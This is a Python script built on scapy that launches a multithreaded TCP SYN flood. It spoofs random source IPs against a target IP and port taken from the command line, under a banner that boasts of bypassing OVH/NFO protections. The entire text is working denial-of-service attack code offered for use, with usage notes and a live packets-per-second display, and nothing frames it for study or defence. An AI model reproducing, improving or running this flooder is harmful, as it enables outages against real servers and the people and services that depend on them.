# Also OVH/NFO bypass
print("""
 /$$   /$$                               /$$             /$$$$$$$$              
| $$  /$$/                              | $$            | $$_____/              
| $$ /$$/  /$$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$      | $$       /$$$$$$/$$$$ 
| $$$$$/  | $$__  $$ /$$__  $$ /$$_____/| $$  /$$/      | $$$$$   | $$_  $$_  $$
| $$  $$  | $$  \ $$| $$  \ $$| $$      | $$$$$$/       | $$__/   | $$ \ $$ \ $$
| $$\  $$ | $$  | $$| $$  | $$| $$      | $$_  $$       | $$      | $$ | $$ | $$
| $$ \  $$| $$  | $$|  $$$$$$/|  $$$$$$$| $$ \  $$      | $$$$$$$$| $$ | $$ | $$
|__/  \__/|__/  |__/ \______/  \_______/|__/  \__/      |________/|__/ |__/ |__/
________________________________________________________________________________

    #################### Predator or pray, predator or pray
    # BossFight 2017   # Nock em out
    # Sweden           # Nock em out
    #################### Predator or pray, predator or pray
    
    
    Music: https://www.youtube.com/watch?v=F0PUVKfxkTM""")
from scapy.all import *
from threading import Thread
import threading
import sys
import time
i = 0
attack_num = 0
#default gateway IP
try:
	target_ip = str(sys.argv[1])
	threaddd = int(sys.argv[3])
	target_port = int(sys.argv[2])
except Exception:
	print("""
Usage:
python3 SYN.py ip port threads
Ex:
python3 SYN.py 1.1.1.1 80 100
Notes:
Don't go over 500 in threads.""")
	exit()
def synFloodAttack(target_ip, sport, dport):
	s_addr = RandIP()   #random Ip address
	pkt =IP(src= s_addr, dst= target_ip)/ TCP(sport =sport, dport=dport, seq= 1505066, flags="S")
	send(pkt, verbose=0)
def attack1():
	t0 = time.time()
	attack_num = 0
	i = 0
	while True:
		attack_num = attack_num + 1234
		t1 = time.time()
		total = t1-t0
		i = i + 1234
		synFloodAttack(target_ip, 1234 , target_port)
		if total > 1:
			os.system("clear")
			print("""
Packets Sent:
| """ + str(attack_num)  + """ |
Method:
| SYN |
IP:
| """ + target_ip + """ |
Packets/sec:
| """ + str(i) + """ |
Threads:
| """ + str(threaddd) + """ |""")
			t0 = time.time()
			i = 0
def attack():
	t0 = time.time()
	attack_num = 0
	i = 0
	while True:
		attack_num = attack_num + 1234
		t1 = time.time()
		total = t1-t0
		synFloodAttack(target_ip, 1234 , target_port)
for i in range(threaddd):
	print("Destroyer ==> " + str(i) + " <== started")
	thread = threading.Thread(target=attack)
	thread.start()
thread = threading.Thread(target=attack1)
thread.start()